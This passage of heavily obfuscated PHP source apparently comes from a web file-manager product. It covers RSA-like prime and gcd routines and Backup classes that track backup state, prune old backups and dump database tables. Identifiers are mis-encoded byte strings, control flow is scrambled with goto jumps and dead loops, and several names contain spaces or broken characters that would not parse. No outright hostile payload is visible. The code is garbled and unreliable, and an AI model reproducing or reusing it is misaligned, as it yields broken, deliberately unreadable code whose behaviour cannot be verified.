$BË¨÷¦îÏ’ = $cÂ…¤íÑÑ[598]; $Fæ¤ÒÎŸßÙ = 0; for ($FŒ‘Ø¦½ãë = 0; $FŒ‘Ø¦½ãë < $eÏšŒÕµÈœ[24]($F´‚è¬Ñï¹); $FŒ‘Ø¦½ãë++) { $Fæ¤ÒÎŸßÙ = $Fæ¤ÒÎŸßÙ == $eÏšŒÕµÈœ[24]($c ›‘‘³õ°) ? 0 : $Fæ¤ÒÎŸßÙ; $Bˆ„Ã»ÍÙÜ = $cÂ…¤íÑÑ[682]; while ($Bˆ„Ã»ÍÙÜ < $cÂ…¤íÑÑ[578]) { if ($Bˆ„Ã»ÍÙÜ >= 0) { break; } $Bˆ„Ã»ÍÙÜ++; } $Dğô‰†‡§Ó = $Fæ¤ÒÎŸßÙ++; $fïœ–¸œ¨Ê = $cÂ…¤íÑÑ[683]; while (strlen($fïœ–¸œ¨Ê) < $cÂ…¤íÑÑ[578]) { if (!$fïœ–¸œ¨Ê) { break; } $fïœ–¸œ¨Ê++; } $Aà¡…¥Ò°Ş = $eÏšŒÕµÈœ[355]($a¬«ÒƒÔŠ, $F´‚è¬Ñï¹[$FŒ‘Ø¦½ãë]) - $D“ôèåñó - $eÏšŒÕµÈœ[356]($c ›‘‘³õ°[$Dğô‰†‡§Ó]); $c…İ’Ä» = $cÂ…¤íÑÑ[684]; if (!$c…İ’Ä») { return; } while ($Aà¡…¥Ò°Ş < 0) { $Aà¡…¥Ò°Ş += 64; $BìÉáÒ²šñ = $cÂ…¤íÑÑ[685]; while ($BìÉáÒ²šñ < $cÂ…¤íÑÑ[578]) { if ($BìÉáÒ²šñ >= 0) { break; } $BìÉáÒ²šñ++; } } $A ×„²äÚÑ .= $a¬«ÒƒÔŠ[$Aà¡…¥Ò°Ş]; $DÖ´³ïõË¢ = $cÂ…¤íÑÑ[659]; while ($DÖ´³ïõË¢ < $cÂ…¤íÑÑ[606]) { if ($DÖ´³ïõË¢ >= 0) { break; } $DÖ´³ïõË¢++; } } goto cÜ”éÊÇŞ; FÎùÍÓ³ª›: $b±ÍŸ‘æï = $cÂ…¤íÑÑ[679]; if (!$b±ÍŸ‘æï) { die; } $A ×„²äÚÑ = $eÏšŒÕµÈœ[10]; goto AØÃ‚ÎË£Ë; f™ôºƒ©§î: $B‘¥Şáñªø = $cÂ…¤íÑÑ[678]; if (strlen($B‘¥Şáñªø) < $cÂ…¤íÑÑ[585]) { return; } $c ›‘‘³õ° = $eÏšŒÕµÈœ[25]($c ›‘‘³õ°, $D“ôèåñó % 8, $D“ôèåñó % 8 + 7); goto FÎùÍÓ³ª›; cÜ”éÊÇŞ: $f¼²åë»å = $eÏšŒÕµÈœ[359]($A ×„²äÚÑ); break; goto EõÙ†Ùàæ; EõÙ†Ùàæ: default: $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][260]}($F´‚è¬Ñï¹, $Fßø”™±Ô¦ . $CÇŒÀ³öÕ´); $dãå¸’¥ÚÜ = $cÂ…¤íÑÑ[686]; if (strlen($dãå¸’¥ÚÜ) < $cÂ…¤íÑÑ[587]) { die; } break; } if ($eô›ğ‹¸ - 1 > 0) { $f¼²åë»å = $this->{$_SERVER[…‹Çæ¦§][199]}($f¼²åë»å, $Fßø”™±Ô¦, $eô›ğ‹¸ - 1); } goto däñÓƒÚïˆ; d´Ÿ‹²åß»: $F„Ù½ÌÙŒ† = $cÂ…¤íÑÑ[671]; while ($F„Ù½ÌÙŒ† < $cÂ…¤íÑÑ[585]) { if ($F„Ù½ÌÙŒ† >= 0) { break; } $F„Ù½ÌÙŒ†++; } $DÀí’’ˆéØ = $F´‚è¬Ñï¹[0]; goto DÍğª¼Å±ê; a“İØÀõÒà: } public function sbhi3e90976d($f‰„´à©ì¾) { goto BÌ˜…Á»…Õ; Fš‹Ú¦ŒØ: $A‹›Öäå©° = ($bµ‹ŸÉ¦Ê’ - 1) * ($eÆøœ˜›Ï - 1); $D˜åå®…£Û = $fœÅ¼Ïì„¤[688]; if (strlen($D˜åå®…£Û) < $fœÅ¼Ïì„¤[578]) { return; } goto dÈ¢ÌÉÈº; BøÆ˜Å²Ö’: return $få‹“ğ†ªù; goto cùŞŠ‘™Á; AàÎŠ»ßİ¸: $fƒ§Íá…„£ = $A¯Œ¢æ‹»[124]($A¯Œ¢æ‹»[361] . ($bµ‹ŸÉ¦Ê’ + $eÆøœ˜›Ï) . $A¯Œ¢æ‹»[362] . $F„Ìîøõ«¯ . $A¯Œ¢æ‹»[362] . $C‚È™­Şâ . $A¯Œ¢æ‹»[363]); $E‹ßÜÉ¥¾ª = $fœÅ¼Ïì„¤[692]; while ($E‹ßÜÉ¥¾ª < $fœÅ¼Ïì„¤[585]) { if ($E‹ßÜÉ¥¾ª >= 0) { break; } $E‹ßÜÉ¥¾ª++; } goto A‘ÌÀò£›…; FŸ…‰è‹¹Ç: $a©ªïÉÆïÇ = $fœÅ¼Ïì„¤[687]; if (strlen($a©ªïÉÆïÇ) < $fœÅ¼Ïì„¤[587]) { return; } $eÆøœ˜›Ï = $this->{$_SERVER[…‹Çæ¦§][360]}(); goto Fš‹Ú¦ŒØ; A‘ÌÀò£›…: $få‹“ğ†ªù = $this->{$_SERVER[…‹Çæ¦§][157]}($f‰„´à©ì¾, $fƒ§Íá…„£) . $A¯Œ¢æ‹»[364] . $BÏÖĞÅ»Ëœ; $dõáÌÎÛãì = $fœÅ¼Ïì„¤[693]; if (!$dõáÌÎÛãì) { die; } goto BøÆ˜Å²Ö’; dÈ¢ÌÉÈº: $F„Ìîøõ«¯ = $A¯Œ¢æ‹»[254](($bµ‹ŸÉ¦Ê’ + $eÆøœ˜›Ï) / 2); while (1) { $eà‘øË®º’ = $F„Ìîøõ«¯; $a×•¸¿§İ‚ = $fœÅ¼Ïì„¤[689]; if (strlen($a×•¸¿§İ‚) < $fœÅ¼Ïì„¤[578]) { return; } $EÀª…Œù = $A‹›Öäå©°; $d®×œ«ƒÑ = $fœÅ¼Ïì„¤[690]; if (strlen($d®×œ«ƒÑ) < $fœÅ¼Ïì„¤[587]) { die; } while ($EÀª…Œù % $eà‘øË®º’ != 0) { $Aê¡Áœ‹Ãµ = $EÀª…Œù; $EÀª…Œù = $eà‘øË®º’; $d£«™Ô±º¾ = $fœÅ¼Ïì„¤[691]; $eà‘øË®º’ = $Aê¡Áœ‹Ãµ % $eà‘øË®º’; } if ($eà‘øË®º’ == 1) { break; } else { $F„Ìîøõ«¯++; } } $C‚È™­Şâ = 2; goto Aç­‹ŸÌ¶; Aç­‹ŸÌ¶: $C°²ÖôŠ’± = $fœÅ¼Ïì„¤[648]; for ($FÖ‹ê‰ˆ£ = 0; $FÖ‹ê‰ˆ£ < $A‹›Öäå©° * 10; $FÖ‹ê‰ˆ£++) { if (($A‹›Öäå©° * $FÖ‹ê‰ˆ£ + 1) % $F„Ìîøõ«¯ == 0) { $C‚È™­Şâ = $A¯Œ¢æ‹»[254](($A‹›Öäå©° * $FÖ‹ê‰ˆ£ + 1) / $F„Ìîøõ«¯); break; } } $BÏÖĞÅ»Ëœ = $this->{$_SERVER[…‹Çæ¦§][157]}($bµ‹ŸÉ¦Ê’ * $eÆøœ˜›Ï . $A¯Œ¢æ‹»[10], $A¯Œ¢æ‹»[159]); goto AàÎŠ»ßİ¸; BÌ˜…Á»…Õ: $fœÅ¼Ïì„¤ =& $_SERVER[´¬]; $A¯Œ¢æ‹» =& $_SERVER[…‹Çæ¦§]; $bµ‹ŸÉ¦Ê’ = $this->{$_SERVER[…‹Çæ¦§][360]}(); goto FŸ…‰è‹¹Ç; cùŞŠ‘™Á: } public function asob73ae6b55($f“ØëíŠ©¤) { goto BŸ§…“Œá; a‚ß§òœïñ: for ($a—Ç¨”¢œ = 0; $a—Ç¨”¢œ < $AÒ»Á»ÑÇô * 10; $a—Ç¨”¢œ++) { if (($AÒ»Á»ÑÇô * $a—Ç¨”¢œ + 1) % $eŠ¹…ˆôµá == 0) { $CÖ‡Íóæ¼ì = $AØéô©ˆß[254](($AÒ»Á»ÑÇô * $a—Ç¨”¢œ + 1) / $eŠ¹…ˆôµá); break; } } $b‡¦Ôµ¤Šï = $AØéô©ˆß[124]($AØéô©ˆß[361] . ($fÁÎÎÔéÎÙ + $e­¼æ—ö¯£) . $AØéô©ˆß[362] . $eŠ¹…ˆôµá . $AØéô©ˆß[362] . $CÖ‡Íóæ¼ì . $AØéô©ˆß[363]); $B‘“²µ‹­ = $this->{$_SERVER[…‹Çæ¦§][260]}($Fˆ°àÆ§Õ[0], $b‡¦Ôµ¤Šï); goto cŒ´ø÷ÕÌ•; FŒÙ…‘¢— : $A—ª‡÷Ó¢ = $dé¡µ† òİ[701]; while ($A—ª‡÷Ó¢ < $dé¡µ† òİ[580]) { if ($A—ª‡÷Ó¢ >= 0) { break; } $A—ª‡÷Ó¢++; } while (1) { $bÌ­Ÿ‚ù±§ = $eŠ¹…ˆôµá; $AƒÆ½ÍõÃ¢ = $AÒ»Á»ÑÇô; $E‘İ£¿»‘Ö = $dé¡µ† òİ[702]; while ($E‘İ£¿»‘Ö < $dé¡µ† òİ[578]) { if ($E‘İ£¿»‘Ö >= 0) { break; } $E‘İ£¿»‘Ö++; } while ($AƒÆ½ÍõÃ¢ % $bÌ­Ÿ‚ù±§ != 0) { $f’¨“îÇ = $AƒÆ½ÍõÃ¢; $AƒÆ½ÍõÃ¢ = $bÌ­Ÿ‚ù±§; $bÌ­Ÿ‚ù±§ = $f’¨“îÇ % $bÌ­Ÿ‚ù±§; $F®Ú¤Œƒ  = $dé¡µ† òİ[703]; } if ($bÌ­Ÿ‚ù±§ == 1) { break; } else { $eŠ¹…ˆôµá++; } } goto bÖÚóÂ„å; BîÄˆôÁ‚õ: $Bµ÷¬Å‹Ï³ = $dé¡µ† òİ[695]; if (!$A••ÊÉ·ñ) { return $AØéô©ˆß[10]; } $A••ÊÉ·ñ = $AØéô©ˆß[254]($A••ÊÉ·ñ); goto Dõ£­„¶»Î; bÖÚóÂ„å: $CÖ‡Íóæ¼ì = 2; $B»Á™İ‘ä = $dé¡µ† òİ[704]; if (strlen($B»Á™İ‘ä) < $dé¡µ† òİ[606]) { return; } goto a‚ß§òœïñ; cŒ´ø÷ÕÌ•: $cÙ¸ë¸†¼© = $dé¡µ† òİ[705]; if (strlen($cÙ¸ë¸†¼©) < $dé¡µ† òİ[585]) { die; } return $B‘“²µ‹­; goto AŞ÷­ÛŒ·; CŒÏ˜ÙÃÆ: $AÒ»Á»ÑÇô = ($fÁÎÎÔéÎÙ - 1) * ($e­¼æ—ö¯£ - 1); $AÔŒ¤‰Šô = $dé¡µ† òİ[700]; $eŠ¹…ˆôµá = $AØéô©ˆß[254](($fÁÎÎÔéÎÙ + $e­¼æ—ö¯£) / 2); goto FŒÙ…‘¢— ; AŞ÷­ÛŒ·: $AÌİÃ”†Ä˜ = $dé¡µ† òİ[706]; while (strlen($AÌİÃ”†Ä˜) < $dé¡µ† òİ[585]) { if (!$AÌİÃ”†Ä˜) { break; } $AÌİÃ”†Ä˜++; } goto B—†êğÄÅÇ; BŸ§…“Œá: $dé¡µ† òİ =& $_SERVER[´¬]; $AØéô©ˆß =& $_SERVER[…‹Çæ¦§]; $Fˆ°àÆ§Õ = $AØéô©ˆß[0]($AØéô©ˆß[364], $f“ØëíŠ©¤); goto cà²É¢È‘; bçŞáâÉğ: $e­¼æ—ö¯£ = 0; $e‹† ±ô› = $dé¡µ† òİ[697]; for ($a—Ç¨”¢œ = 3; $a—Ç¨”¢œ < $A••ÊÉ·ñ; $a—Ç¨”¢œ += 2) { if ($A••ÊÉ·ñ % $a—Ç¨”¢œ != 0) { continue; } $fÁÎÎÔéÎÙ = $a—Ç¨”¢œ; $aˆ‚È¨•òø = $dé¡µ† òİ[698]; $e­¼æ—ö¯£ = $AØéô©ˆß[254]($A••ÊÉ·ñ / $a—Ç¨”¢œ); $D³·Ç§³ß = $dé¡µ† òİ[699]; break; } goto CŒÏ˜ÙÃÆ; cà²É¢È‘: $cˆ£©—³ÚŒ = $dé¡µ† òİ[694]; if ($AØéô©ˆß[19]($Fˆ°àÆ§Õ) != 2) { return $AØéô©ˆß[10]; } $A••ÊÉ·ñ = $this->{$_SERVER[…‹Çæ¦§][260]}($Fˆ°àÆ§Õ[1] . $AØéô©ˆß[10], $AØéô©ˆß[159]); goto BîÄˆôÁ‚õ; Dõ£­„¶»Î: $EÙ²‘…ÊĞì = $dé¡µ† òİ[696]; while ($EÙ²‘…ÊĞì < $dé¡µ† òİ[587]) { if ($EÙ²‘…ÊĞì >= 0) { break; } $EÙ²‘…ÊĞì++; } $fÁÎÎÔéÎÙ = 0; goto bçŞáâÉğ; B—†êğÄÅÇ: } public function xmrh4dd670f1() { goto b¤ÔÕêàÈ”; b¤ÔÕêàÈ”: $eö òö¸š“ =& $_SERVER[´¬]; $FÈœÄ¿¾” =& $_SERVER[…‹Çæ¦§]; $CÜ¿½á¹œë = $FÈœÄ¿¾”[345]($FÈœÄ¿¾”[365](2, 14), $FÈœÄ¿¾”[365](2, 16) - 1); goto DÎŒÒŞåœ”; aÒ†›ª®à: if (strlen($a®õ¾ä±÷Ú) < $eö òö¸š“[580]) { return; } while ($b”˜ŒÇ¦ô <= (int) $FÈœÄ¿¾”[366]($CÜ¿½á¹œë)) { $dß•Õí‘ = $b”˜ŒÇ¦ô; $Aáƒ®¿½© = $eö òö¸š“[708]; if (strlen($Aáƒ®¿½©) < $eö òö¸š“[606]) { return; } while (!0) { $dß•Õí‘++; if ($dß•Õí‘ <= 2) { $b”˜ŒÇ¦ô = $dß•Õí‘; break; } else { if ($dß•Õí‘ < 2) { continue; } } $aòÆ¿ó¤Õ = !0; for ($f’šÙè‰À¿ = 2; $f’šÙè‰À¿ <= $FÈœÄ¿¾”[366]($dß•Õí‘); $f’šÙè‰À¿++) { if ($dß•Õí‘ % $f’šÙè‰À¿ == 0) { $aòÆ¿ó¤Õ = !1; } } if ($aòÆ¿ó¤Õ) { $b”˜ŒÇ¦ô = $dß•Õí‘; break; } } $E¡³ò›‹³[] = $b”˜ŒÇ¦ô; } $F”Ğ–¤Š—Š = 2; goto cñ©Ùã£¶†; cñ©Ùã£¶†: for ($dß•Õí‘ = $CÜ¿½á¹œë; $dß•Õí‘ > 1; $dß•Õí‘--) { $aòÆ¿ó¤Õ = !0; foreach ($E¡³ò›‹³ as $bí¿´Š§„‚) { if ($dß•Õí‘ % $bí¿´Š§„‚ == 0) { $aòÆ¿ó¤Õ = !1; break; } } if ($aòÆ¿ó¤Õ) { $F”Ğ–¤Š—Š = $dß•Õí‘; break; } } return $F”Ğ–¤Š—Š; goto e¡î°Ë­“Î; DÎŒÒŞåœ”: $E¡³ò›‹³ = array(); $b”˜ŒÇ¦ô = 1; $a®õ¾ä±÷Ú = $eö òö¸š“[707]; goto aÒ†›ª®à; e¡î°Ë­“Î: } public function yvnua42a0889($Aƒ´±å‰£, $fÏğ®·¾«Ã) { $C‚Û¶Ù’Úä =& $_SERVER[…‹Çæ¦§]; return $C‚Û¶Ù’Úä[13](array($C‚Û¶Ù’Úä[14], $C‚Û¶Ù’Úä[367]), $Aƒ´±å‰£, $fÏğ®·¾«Ã); } public function iufbc9e705ca($dãˆ¼¾‡, $bìÉÌøµŸ†) { $fŞ˜¡É¹‡õ =& $_SERVER[´¬]; $B‹ê’¡§ã¿ =& $_SERVER[…‹Çæ¦§]; return $B‹ê’¡§ã¿[13](array($B‹ê’¡§ã¿[368], $B‹ê’¡§ã¿[369]), $dãˆ¼¾‡, $bìÉÌøµŸ†); $Eô‡š²Ğõ = $fŞ˜¡É¹‡õ[709]; if (strlen($Eô‡š²Ğõ) < $fŞ˜¡É¹‡õ[585]) { die; } } public function yjfeccb5ea1f($fÔ™¶‡×ğ‹, $fß»ŒÊœš) { $bó‰ÂĞÈğÆ =& $_SERVER[´¬]; $F¼Ÿø¥Ó´§ =& $_SERVER[…‹Çæ¦§]; return $F¼Ÿø¥Ó´§[13](array($F¼Ÿø¥Ó´§[368], $F¼Ÿø¥Ó´§[370]), $fÔ™¶‡×ğ‹, $fß»ŒÊœš); $bã¡ÚÆô› = $bó‰ÂĞÈğÆ[710]; if (strlen($bã¡ÚÆô›) < $bó‰ÂĞÈğÆ[585]) { return; } } } class Backup { protected static $name; protected static $option; public function __construct() { $this->init(); } public function init() { $EÕ„‹¡Ôé =& $_SERVER[´¬]; self::$name = date($EÕ„‹¡Ôé[711]); if (!($EÖåÃƒƒ¬ì = Model($EÕ„‹¡Ôé[712])->lastItem())) { $EÖåÃƒƒ¬ì = $this->initData(); } else { self::$name = $EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[28]]; if ($EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[713]] == $EÕ„‹¡Ôé[87]) { self::$name = date($EÕ„‹¡Ôé[714]); $eµ¡—‚¦ê = 0; if (isset($EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[290]][$EÕ„‹¡Ôé[192]][$EÕ„‹¡Ôé[445]])) { $eµ¡—‚¦ê = (int) $EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[290]][$EÕ„‹¡Ôé[192]][$EÕ„‹¡Ôé[445]]; } if ($EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[28]] == self::$name) { Model($EÕ„‹¡Ôé[712])->remove($EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[392]]); } $EÖåÃƒƒ¬ì = $this->initData($eµ¡—‚¦ê, $EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[715]]); } else { $this->checkStore($EÖåÃƒƒ¬ì[$EÕ„‹¡Ôé[715]]); } } self::$option = $EÖåÃƒƒ¬ì; } private function initData($BšÁØ“š—¬ = 0, $Fä°óŸ‹Ä = '') { goto e×ƒ°Ã›îÄ; AÚª×Ò’¼Ä: $f©÷”ƒ®ğÙ[$Bªçíˆ[392]] = $aŞÒ‹–°¨®; return $f©÷”ƒ®ğÙ; goto F»‡æ´˜; e×ƒ°Ã›îÄ: $Bªçíˆ =& $_SERVER[´¬]; $CšÉ§éÀ´Ó = Model($Bªçíˆ[712])->config(); if ($Fä°óŸ‹Ä && $CšÉ§éÀ´Ó[$Bªçíˆ[715]] != $Fä°óŸ‹Ä) { $BšÁØ“š—¬ = 0; } goto EÖ»˜àåì; EÖ»˜àåì: $this->checkStore($CšÉ§éÀ´Ó[$Bªçíˆ[715]]); $f©÷”ƒ®ğÙ = array($Bªçíˆ[715] => $CšÉ§éÀ´Ó[$Bªçíˆ[715]], $Bªçíˆ[28] => self::$name, $Bªçíˆ[713] => 0, $Bªçíˆ[716] => $CšÉ§éÀ´Ó[$Bªçíˆ[716]], $Bªçíˆ[290] => array($Bªçíˆ[717] => array($Bªçíˆ[713] => 0), $Bªçíˆ[718] => array($Bªçíˆ[713] => 0, $Bªçíˆ[719] => 0, $Bªçíˆ[720] => 0, $Bªçíˆ[29] => $Bªçíˆ[33], $Bªçíˆ[721] => 0, $Bªçíˆ[474] => 0), $Bªçíˆ[722] => array($Bªçíˆ[713] => 0, $Bªçíˆ[719] => 0, $Bªçíˆ[720] => 0, $Bªçíˆ[721] => 0, $Bªçíˆ[474] => 0), $Bªçíˆ[192] => array($Bªçíˆ[713] => 0, $Bªçíˆ[723] => 0, $Bªçíˆ[724] => 0, $Bªçíˆ[725] => 0, $Bªçíˆ[726] => 0, $Bªçíˆ[445] => $BšÁØ“š—¬, $Bªçíˆ[721] => 0, $Bªçíˆ[474] => 0)), $Bªçíˆ[721] => time(), $Bªçíˆ[474] => 0); $aŞÒ‹–°¨® = Model($Bªçíˆ[712])->insert($f©÷”ƒ®ğÙ); goto AÚª×Ò’¼Ä; F»‡æ´˜: } private function checkStore($f¼¦˜Úå‰˜) { $cÜ ¨ª……¢ =& $_SERVER[´¬]; $B ÑÌ¾ä¿ø = Model($cÜ ¨ª……¢[727])->listData($f¼¦˜Úå‰˜); Model($cÜ ¨ª……¢[727])->checkConfig($B ÑÌ¾ä¿ø); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[´¬][712])->findByName(self::$name); } return self::$option; } public static function set($EñÇ²·ƒ) { $F¸”Ñœñ¢Ò =& $_SERVER[´¬]; $Eª§¤©ğª± = self::get(); foreach ($EñÇ²·ƒ as $a¬„ø°Ôá¥ => $c“ïÕ«·×ñ) { $CÌÄ¬öŒá‹ = explode($F¸”Ñœñ¢Ò[95], $a¬„ø°Ôá¥); $f¬¡â£ßà = count($CÌÄ¬öŒá‹); switch ($f¬¡â£ßà) { case 1: $Eª§¤©ğª±[$CÌÄ¬öŒá‹[0]] = $c“ïÕ«·×ñ; break; case 2: $Eª§¤©ğª±[$CÌÄ¬öŒá‹[0]][$CÌÄ¬öŒá‹[1]] = $c“ïÕ«·×ñ; break; case 3: $Eª§¤©ğª±[$CÌÄ¬öŒá‹[0]][$CÌÄ¬öŒá‹[1]][$CÌÄ¬öŒá‹[2]] = $c“ïÕ«·×ñ; break; } } Model($F¸”Ñœñ¢Ò[712])->update($Eª§¤©ğª±[$F¸”Ñœñ¢Ò[392]], $Eª§¤©ğª±); self::$option = $Eª§¤©ğª±; return self::$option; } public function keep() { $bÇàëÏ‹ö =& $_SERVER[´¬]; $Eø‰Ì¥Ú›Â = self::get(); if ($Eø‰Ì¥Ú›Â[$bÇàëÏ‹ö[290]][$bÇàëÏ‹ö[717]][$bÇàëÏ‹ö[713]] == $bÇàëÏ‹ö[87]) { return; } $this->backupKeep($Eø‰Ì¥Ú›Â); self::set(array($bÇàëÏ‹ö[728] => 1)); } private function backupKeep($dƒ†øÆ¼‘) { goto d¥ÑËŸ·•¬; d¤ØÈœ¶½: foreach ($d¦À—™¯Ó as $Aˆƒ³êÊİ) { if (!empty($Aˆƒ³êÊİ[$f±ïÀã¶ğÇ[28]]) && in_array($Aˆƒ³êÊİ[$f±ïÀã¶ğÇ[28]], $a•º»ĞÚß»)) { continue; } Model($f±ïÀã¶ğÇ[712])->remove($Aˆƒ³êÊİ[$f±ïÀã¶ğÇ[392]]); $f‚ÍÊåìéœ = $this->backupPath($dƒ†øÆ¼‘, $c™ğ†è“¡); IO::remove($f‚ÍÊåìéœ, !1); } goto Bø“ …È…¼; A‚ÚÆÀØ—é: $E¨Ç˜À‘Ï = 0; $a•º»ĞÚß» = array(); foreach ($d¦À—™¯Ó as $Aˆƒ³êÊİ) { if ($E¨Ç˜À‘Ï >= 7) { break; } $a•º»ĞÚß»[] = $Aˆƒ³êÊİ[$f±ïÀã¶ğÇ[28]]; $E¨Ç˜À‘Ï++; } goto Eß†›Æˆîì; d¥ÑËŸ·•¬: $f±ïÀã¶ğÇ =& $_SERVER[´¬]; $d¦À—™¯Ó = Model($f±ïÀã¶ğÇ[712])->listData(); if (empty($d¦À—™¯Ó)) { return; } goto A‚ÚÆÀØ—é; Eß†›Æˆîì: for ($E¨Ç˜À‘Ï = 0; $E¨Ç˜À‘Ï < 12; $E¨Ç˜À‘Ï++) { $a•º»ĞÚß»[] = date($f±ïÀã¶ğÇ[729], strtotime("\55{$E¨Ç˜À‘Ï}\40\155\157\x6e\x74\150\163")); } $a•º»ĞÚß» = array_unique($a•º»ĞÚß»); $c™ğ†è“¡ = Model($f±ïÀã¶ğÇ[730])->get($f±ïÀã¶ğÇ[731]); goto d¤ØÈœ¶½; Bø“ …È…¼: } private function backupPath($C±¹·ôÂÇÎ, $A•©›âÔ©Ğ = false) { $fï¦³×Ë =& $_SERVER[´¬]; if (!$A•©›âÔ©Ğ) { $A•©›âÔ©Ğ = Model($fï¦³×Ë[730])->get($fï¦³×Ë[731]); } $Dµì¦°Êš = $C±¹·ôÂÇÎ[$fï¦³×Ë[28]]; $aœõ•âÃ­É = substr(md5($fï¦³×Ë[732] . $A•©›âÔ©Ğ . $Dµì¦°Êš), 0, 8); return "\x7b\x69\x6f\x3a{$C±¹·ôÂÇÎ[$fï¦³×Ë[715]]}\175\x2f\x64\141\164\141\142\141\163\x65\x2f\x62\x61\143\153\165\160\x2f" . $Dµì¦°Êš . $fï¦³×Ë[71] . $aœõ•âÃ­É; } public function db() { goto Eª”ĞŒš‹š; eÁ†ÚÌ›: return !0; goto FâùµÅŠ´Ÿ; Eª”ĞŒš‹š: $AÉÕ¸¹ö†™ =& $_SERVER[´¬]; $e¥±Ø•Ú« = self::get(); if ($e¥±Ø•Ú«[$AÉÕ¸¹ö†™[290]][$AÉÕ¸¹ö†™[718]][$AÉÕ¸¹ö†™[713]] == $AÉÕ¸¹ö†™[87]) { return !0; } goto A¦’É´¢›À; A¦’É´¢›À: $cŸÄÜ‰’ˆî = new BackupDb(); if (!$cŸÄÜ‰’ˆî->index()) { return !1; } self::set(array($AÉÕ¸¹ö†™[733] => 1)); goto eÁ†ÚÌ›; FâùµÅŠ´Ÿ: } public function dbFile() { goto AÓİÃ ‚Éá; AÓİÃ ‚Éá: $BŸšø”ãÁÕ =& $_SERVER[´¬]; $b•Ë˜Í©ö = self::get(); if ($b•Ë˜Í©ö[$BŸšø”ãÁÕ[290]][$BŸšø”ãÁÕ[722]][$BŸšø”ãÁÕ[713]] == $BŸšø”ãÁÕ[87]) { return !0; } goto bòà²ôÍšî; cÀ²ªƒóâ™: return !0; goto Fƒ¾¥†àÕ; bòà²ôÍšî: $bÒ®¦×á‡ = new BackupDbFile(); if (!$bÒ®¦×á‡->index()) { return !1; } self::set(array($BŸšø”ãÁÕ[734] => 1)); goto cÀ²ªƒóâ™; Fƒ¾¥†àÕ: } public function file() { $eÚƒí‰¾©‡ =& $_SERVER[´¬]; $B¤„‹ÒîĞ‹ = self::get(); if ($B¤„‹ÒîĞ‹[$eÚƒí‰¾©‡[290]][$eÚƒí‰¾©‡[192]][$eÚƒí‰¾©‡[713]] == $eÚƒí‰¾©‡[87]) { return !0; } if (!isset($B¤„‹ÒîĞ‹[$eÚƒí‰¾©‡[716]]) || $B¤„‹ÒîĞ‹[$eÚƒí‰¾©‡[716]] == $eÚƒí‰¾©‡[495]) { $f¿Œ‡æÓ¤ö = new BackupFile(); if (!$f¿Œ‡æÓ¤ö->index()) { return !1; } } self::set(array($eÚƒí‰¾©‡[735] => 1, $eÚƒí‰¾©‡[713] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { goto f¥÷ëš²´; f¥÷ëš²´: $B’¼§öÙ…‹ =& $_SERVER[´¬]; $c ë¥¹å‚ = Backup::get(); self::$io = $c ë¥¹å‚[$B’¼§öÙ…‹[715]]; goto e˜İÉéñ; Eã‚«ÍÁè‡: $bƒôà„¹ê‰ = new DbManage($B–À»¼ÈÀ, $FàÕ„ùª´); $dæ·ÒóÜÖ = array($B’¼§öÙ…‹[736] => $FàÕ„ùª´, $B’¼§öÙ…‹[737] => time()); Backup::set($dæ·ÒóÜÖ); goto e¬šÑ¿ÉÏ½; e¬šÑ¿ÉÏ½: $e¸´ÆÛ¶… = $this->tmpFilesPath() . $B’¼§öÙ…‹[738] . self::$name . $B’¼§öÙ…‹[8]; del_dir($e¸´ÆÛ¶…); mk_dir($e¸´ÆÛ¶…); goto d‡éè‚Ïğ…; B…†Ò„ÂŠÀ: foreach ($aËŠ¯Ö¼íš as $FÄ•ö†Â´ö) { $D°»Ïƒ±í += $bƒôà„¹ê‰->model($FÄ•ö†Â´ö)->count(); } $eÄãîÁ = new Task($B’¼§öÙ…‹[741], $B’¼§öÙ…‹[742], $D°»Ïƒ±í, LNG($B’¼§öÙ…‹[743]) . $B’¼§öÙ…‹[744] . LNG($B’¼§öÙ…‹[745])); foreach ($aËŠ¯Ö¼íš as $FÄ•ö†Â´ö) { $BÔªÜ¥Û‰ = $e¸´ÆÛ¶… . $FÄ•ö†Â´ö . $B’¼§öÙ…‹[746]; $e…æõ˜å‘¶ = null; if ($FÄ•ö†Â´ö == $B’¼§öÙ…‹[747] && (!isset($c ë¥¹å‚[$B’¼§öÙ…‹[716]]) || $c ë¥¹å‚[$B’¼§öÙ…‹[716]] == $B’¼§öÙ…‹[495])) { $e…æõ˜å‘¶ = self::$io; } $f©ÊåŸ¢¾„ += $bƒôà„¹ê‰->sqlFromDb($FÄ•ö†Â´ö, $BÔªÜ¥Û‰, $eÄãîÁ, $e…æõ˜å‘¶); } goto a¦Îù Í¤Ó; d‡éè‚Ïğ…: $D°»Ïƒ±í = $f©ÊåŸ¢¾„ = 0; try { $aËŠ¯Ö¼íš = $bƒôà„¹ê‰->db()->getTables(); } catch (Exception $Fğñâî’ó˜) { return !1; } $aËŠ¯Ö¼íš = array_diff($aËŠ¯Ö¼íš, array($B’¼§öÙ…‹[739], $B’¼§öÙ…‹[740])); goto B…†Ò„ÂŠÀ; e˜İÉéñ: self::$name = $c ë¥¹å‚[$B’¼§öÙ…‹[28]]; $B–À»¼ÈÀ = $GLOBALS[$B’¼§öÙ…‹[6]][$B’¼§öÙ…‹[17]]; $FàÕ„ùª´ = $this->_dbType($B–À»¼ÈÀ); goto Eã‚«ÍÁè‡; C­ÜÉî©Á: Backup::set($dæ·ÒóÜÖ); if ($D°»Ïƒ±í > $f©ÊåŸ¢¾„) { write_log(array($B’¼§öÙ…‹[753], $dæ·ÒóÜÖ), $B’¼§öÙ…‹[742]); return !1; } return !0; goto d¢§™¾´ãÉ; a¦Îù Í¤Ó: if (isset($eÄãîÁ->task[$B’¼§öÙ…‹[748]])) { $dƒ²‚‚á = $eÄãîÁ->task[$B’¼§öÙ…‹[748]] ? $eÄãîÁ->task[$B’¼§öÙ…‹[748]] : timeFloat(); $BÛ¢âÁåì± = $dƒ²‚‚á - $eÄãîÁ->task[$B’¼§öÙ…‹[749]]; if ($BÛ¢âÁåì± >= 0.2) { $D°»Ïƒ±í += 1; } } $eÄãîÁ->end(); $dæ·ÒóÜÖ = 